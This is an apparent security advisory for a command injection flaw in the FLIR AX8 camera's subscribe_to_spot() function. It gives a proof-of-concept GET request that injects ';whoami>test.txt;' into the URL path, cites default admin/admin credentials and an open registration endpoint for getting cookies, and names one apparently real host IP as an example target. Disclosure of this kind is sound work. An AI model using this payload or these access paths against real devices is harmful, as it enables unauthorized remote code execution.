# Command injection vulnerability in subscribe_to_spot() in FLIR AX8

### Description

Command injection vulnerability in /usr/www/application/models/subscriptions.php  in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the function subscribe_to_spot()

### Note:

This vulnerability is a backend issue that requires obtaining cookies. It  can exploit the unauthorized access vulnerability for arbitrary user  registration found at /tools/test_login.php?action=register. After  registering a new user, cookies can be obtained to achieve RCE (Remote  Code Execution). 

Also.Under normal circumstances, it has a weak password vulnerability with  default account credentials being 'admin' for both user and password too.  You can also obtain a cookie through this method.

### POC

```
GET /home/subscribe/spot/;whoami>test.txt; HTTP/1.1
Host: XXXXXX
Cookie: PHPSESSID=XXXXXXX
```

For example

- this cookie must be changed

```
GET /home/subscribe/spot/;whoami>test.txt; HTTP/1.1
Host: 222.103.211.89:8004
Cookie: PHPSESSID=XXXXXXXX
```



### Anayliss

`/usr/www/application/models/subscriptions.php`

The  subscribe_to_spot() can in the Line 148 can trigger the line 31 shell_exec()



![image-20250528203304783](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505282033820.png)

![image-20250528203257834](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505282032882.png)

